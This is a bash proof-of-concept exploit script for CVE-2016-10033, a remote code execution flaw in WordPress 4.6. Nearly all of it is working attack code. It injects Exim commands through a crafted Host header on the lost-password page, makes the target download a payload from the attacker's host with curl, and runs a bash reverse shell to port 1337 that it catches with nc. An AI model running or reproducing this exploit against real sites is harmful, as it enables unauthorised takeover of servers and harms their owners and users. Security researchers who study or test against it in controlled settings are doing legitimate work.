#!/bin/bash
#
# WordPress 4.6 - Remote Code Execution (RCE) PoC Exploit
# CVE-2016-10033
#
# wordpress-rce-exploit.sh
# Improved RCE PoC Expoint by
#
# Jorge Marin (@chipironcin)
#
# Based on wordpress-rce-exploit.sh (ver. 1.0) from https://exploitbox.io
# Discovered and coded by
#
# Dawid Golunski (@dawid_golunski)
# https://legalhackers.com
#
# Full advisory URL:
# https://exploitbox.io/vuln/WordPress-Exploit-4-6-RCE-CODE-EXEC-CVE-2016-10033.html
#
# Usage:
# ./wordpress-rce-exploit.sh target-wordpress-url [reverse-host]
#
#
# Disclaimer:
# For testing purposes only
# -----------------------------------------------------------------

rev_host="127.0.0.1"
target="localhost"

if [ "$#" -lt 1 ]; then
  echo -e "Usage:\n$0 target-wordpress-url reverse-host\n"
  exit 1
fi
if [ "x$1" != "x" ]; then target="$1"; else exit 1; fi
if [ "x$2" != "x" ]; then rev_host="$2"; fi

# A POSIX variable
# Reset in case getopts has been used previously in the shell.
OPTIND=1
while getopts "r:" opt; do
    case "$opt" in
    f)  rev_host=$OPTARG
        ;;
    esac
done
shift $((OPTIND-1))

function prep_host_header() {
      cmd="$1"
      rce_cmd="\${run{$cmd}}";

      # replace / with ${substr{0}{1}{$spool_directory}}
      # sed 's^/^${substr{0}{1}{$spool_directory}}^g'
      rce_cmd="$(echo $rce_cmd | sed 's^/^\${substr{0}{1}{\$spool_directory}}^g')"

      # replace ' ' (space) with
      # sed 's^ ^${substr{10}{1}{$tod_log}}$^g'
      rce_cmd="$(echo $rce_cmd | sed 's^ ^\${substr{10}{1}{\$tod_log}}^g')"
      # return "target(any -froot@localhost -be $rce_cmd null)"
      host_header="target(any -froot@localhost -be $rce_cmd null)"
      return 0
}

echo -ne "\e[91m[*]\033[0m"
read -p " Sure you want to get a shell on the target '$target' ? [y/N] " choice
echo


if [ "$choice" == "y" ]; then

echo -e "\e[92m[*]\033[0m Guess I can't argue with that... Let's get started...\n"
echo -e "\e[92m[+]\033[0m Connected to the target"

# Serve payload/bash script on :80
RCE_exec_cmd="sleep 3s; nohup bash -i >/dev/tcp/$rev_host/1337 0<&1 2>&1 &"
echo "$RCE_exec_cmd" > rce.txt
python -mSimpleHTTPServer 80 2>/dev/null >&2 &
serverPID=$!

# Save payload on the target in /tmp/rce
cmd="/usr/bin/curl -o/tmp/rce $rev_host/rce.txt"
prep_host_header "$cmd"
curl -H"Host: $host_header" -s -d 'user_login=admin&wp-submit=Get+New+Password' "$target/wp-login.php?action=lostpassword"
echo -e "\n\e[92m[+]\e[0m Payload sent successfully"

kill $serverPID
wait $serverPID 2>/dev/null
rm -R "./rce.txt"

# Execute payload (RCE_exec_cmd) on the target /bin/bash /tmp/rce
cmd="/bin/bash /tmp/rce"
prep_host_header "$cmd"
curl -H"Host: $host_header" -d 'user_login=admin&wp-submit=Get+New+Password' "$target/wp-login.php?action=lostpassword" &
echo -e "\n\e[92m[+]\033[0m Payload executed!"

echo -e "\n\e[92m[*]\033[0m Waiting for the target to send us a \e[94mreverse shell\e[0m...\n"
nc -vv -l -p 1337
echo
else
echo -e "\e[92m[+]\033[0m Responsible choice ;) Exiting.\n"
exit 0

fi

echo "Exiting..."
exit 0
